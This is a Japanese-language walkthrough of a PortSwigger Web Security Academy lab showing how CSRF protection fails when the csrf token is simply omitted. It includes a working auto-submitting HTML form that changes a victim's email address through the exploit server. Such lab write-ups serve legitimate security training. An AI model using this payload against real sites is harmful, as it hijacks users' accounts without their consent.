# トークンの検証がトークンの存在に依存する CSRF

次のハッキングラボを実施します  
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present  
このラボの電子メール変更機能は CSRF に対して脆弱です。

- 1. BurpSuite を起動して、Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインして、メールアドレスを変更します
- 4. リクエスト POST /my-account/change-email HTTP/2 を send to repeater します

* 5. csrf トークンを任意に変更して、送信すると失敗します
* 6. 一方,csrf トークンを全て削除すると、メール変更リクエストは成功します
* 7. エクスプロイトサーバに移動して、body に次のように入力します

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="test@test" />
</form>
<script>
  document.forms[0].submit();
</script>
```

- 8. Store ボタン押下後に send to victim ボタンを押下すると、閲覧者のメールアドレスを変更するページにアクセス誘導できます
